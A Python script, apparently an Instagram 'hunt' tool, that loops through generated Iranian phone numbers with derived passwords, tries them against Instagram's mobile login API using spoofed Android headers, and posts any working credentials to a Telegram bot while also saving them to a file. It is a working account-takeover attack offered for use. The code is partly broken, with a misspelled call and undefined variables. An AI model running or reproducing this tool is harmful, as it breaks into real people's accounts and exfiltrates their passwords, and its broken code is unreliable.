import os

try:
    import uuid,random,requests,user_agent,datetime,string,time,pyfiglet
    
    from random import *
    from user_agent import generate_user_agent
    from datetime import datetime

except ImportError:
    os.system ("pip install uuid")
    os.systeam("pip install random ")
    os.system("pip install string")
    os.system ("pip install requests ")
    os.system("pip install user_agent ")
    os.system("pip install datetime ")
    os.system("pip install pyfiglet")
    
os.system("clear")
bnar = pyfiglet.figlet_format('SANTITO')
yso = ('            Code By : yso - ')
print (bnar+yso)

import random,uuid,requests,string,threading,json,secrets,uuid,webbrowser

from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
from colorama import Fore, Style
from uuid import uuid4
from secrets import token_hex
import os
import random,json,threading,secrets,uuid

qq = 0
cc = 0

# = = = = = = = = = = = = 

Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح

# = = = = = = = = = = = =

#webbrowser.open('https://t.me/')

print('\n')

ID = input(S + '  ID : ')
print('\n')
sleep(2)
tok = input(S + ' TOKEN : ')

os.system("clear")
print ('    - Start The Hunt pls Wait ..')
start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= Hi Sure Just Wait ").json()
id_msg =(start_msg['result']["message_id"])
w= 'https://pastebin.com/raw/xPfV5eKD'
rss = requests.get(w).text
if  'YSO' in rss:
    sleep(0.10)
r = requests.Session()
user = '0987654321'

while True:
        us = str("".join(random.choice(user)for i in range(7)))        
        username = '+98910'+us
        password = '0910'+us

        url = 'https://i.instagram.com/api/v1/accounts/login/'
        headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'
        }

        uid = str(uuid4())
        data = {        
        'uuid': uid,        
        'password': password, 
         'username': username,           
         'device_id': uid,       
         'from_reg': 'false',
         '_csrftoken': 'missing',          
         'login_attempt_countn': '0'}          
        req_login = r.post(url,headers=headers,data=data,allow_redirects=True)  

        if ("logged_in_user") in req_login.text:

            cc += 1
            print ('username : '+username+': password : '+password)

            tlg =(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝑯𝒆𝒍𝒍𝒐 - 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎
\n- 𝑷𝑯 ➪ {username} ✓\n- 𝑷𝑺 ➪ : {password}\n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @KM8MM -K- @KM8MM''')
            i = requests.post(tlg)
            with open('instagram.txt','a') as Hunt:

                Hunt.write(X+' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))
                

        elif '"message":"challenge_required","challenge"' in req_login.text:
            print (Z1+'username : '+username+': password : '+password)


        else:
            requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= • 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎ ➪[{cc}] \n Warrior \n [{qq}] x ( {username} ) \n• 𝐅𝐫𝐎𝐦 : @XAFXA -K- @KM8MM ")
            print (C+'username  : '+username+': password  : '+password)
            qq += 1